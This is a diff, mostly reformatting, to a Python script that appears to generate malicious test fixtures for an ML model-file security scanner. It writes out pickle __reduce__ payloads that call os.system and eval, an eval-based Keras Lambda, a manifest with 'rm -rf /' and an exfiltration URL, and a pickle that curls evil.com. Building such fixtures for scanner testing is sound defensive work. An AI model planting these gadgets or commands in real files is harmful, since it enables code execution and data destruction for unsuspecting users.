@@ -24,17 +24,18 @@ def make_security_pickles(assets_dir: Path) -> None:
     """Generate security test pickles in the samples/pickles directory."""
     pickles_dir = assets_dir / "samples" / "pickles"
     pickles_dir.mkdir(parents=True, exist_ok=True)
-    
+
     # Only create if they don't already exist (don't overwrite existing)
     malicious_pickle = pickles_dir / "malicious_system_call.pkl"
     if not malicious_pickle.exists():
+
         class MaliciousSystemCall:
             def __reduce__(self):
                 return (os.system, ("echo 'security test - malicious system call'",))
 
         with open(malicious_pickle, "wb") as f:
             pickle.dump(MaliciousSystemCall(), f)
-    
+
     # Safe pickle for comparison
     safe_pickle = pickles_dir / "safe_data.pkl"
     if not safe_pickle.exists():
@@ -46,28 +47,26 @@ def make_security_keras_models(assets_dir: Path) -> None:
     """Generate Keras models for security testing."""
     keras_dir = assets_dir / "samples" / "keras"
     keras_dir.mkdir(parents=True, exist_ok=True)
-    
+
     safe_cfg = {
-        "class_name": "Sequential", 
+        "class_name": "Sequential",
         "config": {
-            "name": "safe_model", 
-            "layers": [
-                {"class_name": "Dense", "config": {"units": 10}}
-            ]
-        }
+            "name": "safe_model",
+            "layers": [{"class_name": "Dense", "config": {"units": 10}}],
+        },
     }
-    
+
     malicious_cfg = {
         "class_name": "Sequential",
         "config": {
             "name": "malicious_model",
             "layers": [
                 {
-                    "class_name": "Lambda", 
+                    "class_name": "Lambda",
                     "config": {
-                        "function": "lambda x: eval('print(\"security test\")')"
-                    }
-                }
+                        "function": "lambda x: eval('print(\"security test\")')",
+                    },
+                },
             ],
         },
     }
@@ -87,7 +86,7 @@ def make_pytorch_security_files(assets_dir: Path) -> None:
     """Generate PyTorch files for security testing."""
     pytorch_dir = assets_dir / "samples" / "pytorch"
     pytorch_dir.mkdir(parents=True, exist_ok=True)
-    
+
     class MaliciousEval:
         def __reduce__(self):
             return (eval, ("print('security test - eval')",))
@@ -110,10 +109,10 @@ def make_tensorflow_security_files(assets_dir: Path) -> None:
     """Generate TensorFlow SavedModel files for security testing."""
     tf_dir = assets_dir / "samples" / "tensorflow"
     tf_dir.mkdir(parents=True, exist_ok=True)
-    
+
     safe_dir = tf_dir / "safe_savedmodel"
     malicious_dir = tf_dir / "malicious_pyfunc"
-    
+
     safe_dir.mkdir(exist_ok=True)
     malicious_dir.mkdir(exist_ok=True)
 
@@ -130,26 +129,26 @@ def make_manifest_security_files(assets_dir: Path) -> None:
     """Generate manifest files for security testing."""
     manifests_dir = assets_dir / "samples" / "manifests"
     manifests_dir.mkdir(parents=True, exist_ok=True)
-    
+
     safe_manifest = {
         "name": "safe_model",
-        "version": "1.0.0", 
-        "config": {"learning_rate": 0.001}
+        "version": "1.0.0",
+        "config": {"learning_rate": 0.001},
     }
-    
+
     malicious_manifest = {
         "name": "suspicious_model",
         "config": {
             "api_key": "sk-1234567890abcdef",  # Looks like API key
             "remote_url": "http://suspicious-domain.com/exfiltrate",
-            "debug_command": "rm -rf /"  # Dangerous command
-        }
+            "debug_command": "rm -rf /",  # Dangerous command
+        },
     }
-    
+
     safe_file = manifests_dir / "safe_config.json"
     if not safe_file.exists():
         safe_file.write_text(json.dumps(safe_manifest, indent=2))
-    
+
     malicious_file = manifests_dir / "suspicious_config.json"
     if not malicious_file.exists():
         malicious_file.write_text(json.dumps(malicious_manifest, indent=2))
@@ -159,7 +158,7 @@ def make_archive_security_files(assets_dir: Path) -> None:
     """Generate archive files for security testing."""
     archives_dir = assets_dir / "samples" / "archives"
     archives_dir.mkdir(parents=True, exist_ok=True)
-    
+
     class MaliciousArchive:
         def __reduce__(self):
             return (os.system, ("echo 'security test - archive payload'",))
@@ -184,55 +183,52 @@ def create_security_scenarios(assets_dir: Path) -> None:
     """Create comprehensive security test scenarios."""
     scenarios_dir = assets_dir / "scenarios" / "security_scenarios"
     scenarios_dir.mkdir(parents=True, exist_ok=True)
-    
+
     # Mixed malicious model scenario
     mixed_dir = scenarios_dir / "mixed_malicious_model"
     mixed_dir.mkdir(exist_ok=True)
-    
+
     # Create a scenario with multiple attack vectors
     scenario_manifest = {
         "model_name": "advanced_threat",
         "config": {
             "api_endpoint": "http://attacker-c2.evil.com/data",
-            "exfil_key": "SECRET_API_KEY_12345"
-        }
+            "exfil_key": "SECRET_API_KEY_12345",
+        },
     }
-    
+
     class MultiVectorAttack:
         def __reduce__(self):
             return (eval, ("__import__('os').system('curl http://evil.com')",))
-    
+
     if not (mixed_dir / "config.json").exists():
         (mixed_dir / "config.json").write_text(json.dumps(scenario_manifest, indent=2))
-    
+
     if not (mixed_dir / "model.pkl").exists():
         with open(mixed_dir / "model.pkl", "wb") as f:
             pickle.dump(MultiVectorAttack(), f)
-
-
-
 
 
 def main() -> None:
     """Generate all security test assets in organized structure."""
     # Use the existing organized assets directory
     assets_dir = Path(__file__).parent.parent
-    
+
     print("🔒 Generating security test assets...")
-    
+
     make_security_pickles(assets_dir)
-    make_security_keras_models(assets_dir)  
+    make_security_keras_models(assets_dir)
     make_pytorch_security_files(assets_dir)
     make_tensorflow_security_files(assets_dir)
     make_manifest_security_files(assets_dir)
     make_archive_security_files(assets_dir)
     create_security_scenarios(assets_dir)
-    
+
     print("✅ Security test assets generated successfully!")
     print(f"📁 Location: {assets_dir}")
     print("\nGenerated assets:")
     print("- samples/pickles/malicious_system_call.pkl")
-    print("- samples/keras/malicious_lambda.h5") 
+    print("- samples/keras/malicious_lambda.h5")
     print("- samples/pytorch/malicious_eval.pt")
     print("- samples/tensorflow/malicious_pyfunc/")
     print("- samples/manifests/suspicious_config.json")
@@ -241,4 +237,4 @@ def main() -> None:
 
 
 if __name__ == "__main__":
-    main() 
+    main()
